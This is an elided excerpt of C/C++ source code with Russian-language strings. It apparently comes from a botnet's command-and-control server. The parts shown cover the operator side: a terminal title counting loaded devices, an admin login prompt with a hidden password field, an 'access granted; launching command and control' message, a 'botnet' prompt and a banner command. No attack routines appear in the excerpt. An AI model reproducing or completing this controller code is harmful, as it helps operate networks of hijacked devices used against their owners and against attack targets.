...
void *title_counter(void *arg)
{
    ...
    while(TRUE)
    {
        ...
        title << "\033]0;устройства загружены: " << client_count(p.max_clients) << "\007";
...
static void *admin(void *arg)
{
    ...
    char const *defaultbanner = "привет сосед";
    ...
    send(fd, "пользователь: ", strlen("пользователь: "), MSG_NOSIGNAL);
    line = recv_line(fd);
    if(std::get<int>(line) <= 0)
    {
        close(fd);
    ...
    send(fd, "пароль: \033[8m", strlen("пароль: \033[8m"), MSG_NOSIGNAL);
    line = recv_line(fd);
    if(std::get<int>(line) <= 0)
    {
        close(fd);
    ...
    login.user_ptr = user;
    login.pass_ptr = pass;
    send(fd, "\033[0mпроверка полномочий", strlen("\033[0mпроверка полномочий"), MSG_NOSIGNAL);
    ...
    {
        send(fd, "\033[0mаутентификация не удалась\033[38;5;196m!\033[0m\r\n", strlen("\033[0mаутентификация не удалась\033[38;5;196m!\033[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    send(fd, "\033[0mдоступ разрешен\033[38;5;118m; \033[0mпусковая команда и управление", strlen("\033[0mдоступ разрешен\033[38;5;118m; \033[0mпусковая команда и управление"), MSG_NOSIGNAL);
    ...
    login.fd = fd;
    char const *defaultprompt = "ботнет";
    ...
    while(TRUE)
    {
        ...
        if(data == "banner")
        {
            ...
            if(strstr(buffer, "default"))
            {
                ...
                sprintf(login.banner, "%s", "привет сосед");
                continue;
            }
            char msg[1024];
